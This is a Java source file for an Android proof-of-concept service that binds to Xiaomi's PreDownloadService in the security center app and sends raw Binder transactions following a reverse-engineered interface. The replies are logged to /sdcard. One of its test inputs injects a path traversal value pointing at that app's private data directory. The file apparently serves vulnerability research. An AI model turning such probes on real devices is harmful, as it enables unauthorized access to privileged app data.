package com.misrc.poc;

import android.app.Service;
import android.content.*;
import android.os.*;
import android.util.Log;

import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.util.ArrayList;

/**
 * 按 onTransact 反汇编得到的真实契约测试：
 *   code=1 u8(String json) -> String    期望 {"resourceParam":{"taskId":..,"resourceKey":".."}}
 *   code=2 l3() -> int
 *   code=3 w2() -> int
 */
public class Json extends Service {

    static final String TAG = "MISRC";
    static final String OUT = "/sdcard/misrc_json.txt";
    static final String SVC = "com.xiaomi.game.predownload.service.PreDownloadService";
    static final String PKG = "com.miui.securitycenter";
    static final String DESC = "com.xiaomi.ecosys.gameservice.ability.predownload.IPreDownload";

    static final ArrayList<String> buf = new ArrayList<String>();
    Context ctx;

    static void w(String s) {
        Log.i(TAG, s);
        synchronized (buf) { buf.add(s); }
    }

    static void flush() {
        try {
            FileOutputStream fo = new FileOutputStream(new File(OUT));
            OutputStreamWriter ow = new OutputStreamWriter(fo, "UTF-8");
            synchronized (buf) { for (String s : buf) ow.write(s + "\n"); }
            ow.flush(); ow.close(); fo.close();
        } catch (Throwable t) { Log.e(TAG, "flush: " + t); }
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        ctx = this;
        synchronized (buf) { buf.clear(); }
        w("=== 按真实契约测试 PreDownloadService ===");
        w("自身 uid=" + android.os.Process.myUid());
        w("");

        ServiceConnection conn = new ServiceConnection() {
            public void onServiceConnected(ComponentName n, IBinder b) {
                try {
                    w("已连接, 描述符=" + b.getInterfaceDescriptor());
                    w("");

                    // ---- code=2 : l3() 返回 int（用 getCallingUid 查包名）----
                    w("--- code=2  l3()");
                    call(b, 2, null, true);

                    // ---- code=3 : w2() 返回 int ----
                    w("--- code=3  w2()");
                    call(b, 3, null, true);

                    // ---- code=1 : u8(String json) 返回 String ----
                    String[] tests = {
                        "{}",
                        "{\"resourceParam\":{}}",
                        "{\"resourceParam\":{\"taskId\":1,\"resourceKey\":\"test\"}}",
                        "{\"resourceParam\":{\"taskId\":\"1\",\"resourceKey\":\"../../../../data/data/com.miui.securitycenter\"}}",
                        "{\"taskId\":1,\"resourceKey\":\"test\"}",
                        "null",
                        "[]",
                        "{\"resourceParam\":{\"taskId\":999999999999,\"resourceKey\":\"x\"}}",
                    };
                    for (String t : tests) {
                        w("--- code=1  u8(" + t + ")");
                        call(b, 1, t, false);
                    }
                } catch (Throwable t) {
                    w("异常: " + t);
                } finally {
                    w("");
                    w("=== 完成 ===");
                    flush();
                    try { unbindService(this); } catch (Throwable t) {}
                    stopSelf();
                }
            }
            public void onServiceDisconnected(ComponentName n) {}
        };

        Intent i = new Intent();
        i.setClassName(PKG, SVC);
        boolean ok = ctx.bindService(i, conn, Context.BIND_AUTO_CREATE);
        w("bindService=" + ok);
        if (!ok) { flush(); stopSelf(); }
        return START_NOT_STICKY;
    }

    static void call(IBinder b, int code, String str, boolean noArg) {
        Parcel d = Parcel.obtain(), r = Parcel.obtain();
        try {
            d.writeInterfaceToken(DESC);
            if (!noArg) d.writeString(str);
            boolean t = b.transact(code, d, r, 0);
            r.setDataPosition(0);
            int avail = r.dataAvail();
            String out = "transact=" + t + " avail=" + avail;
            if (avail >= 4) {
                int ex = r.readInt();
                if (ex != 0) {
                    String msg = null;
                    try { msg = r.readString(); } catch (Throwable x) {}
                    out += "  异常: " + msg;
                } else {
                    out += "  noException";
                    int rest = r.dataAvail();
                    if (rest >= 4) {
                        // 可能是 String 或 int，按 code 判断
                        if (code == 1) {
                            try {
                                String s = r.readString();
                                out += "  String=\"" + s + "\"";
                            } catch (Throwable x) {
                                out += "  (readString失败 " + x.getClass().getSimpleName() + ")";
                            }
                        } else {
                            out += "  int=" + r.readInt();
                        }
                    }
                }
            }
            w("    " + out);
        } catch (Throwable x) {
            w("    异常 " + x.getClass().getSimpleName() + ": " + x.getMessage());
        } finally { d.recycle(); r.recycle(); }
        try { Thread.sleep(150); } catch (Throwable x) {}
    }

    @Override public IBinder onBind(Intent i) { return null; }
}
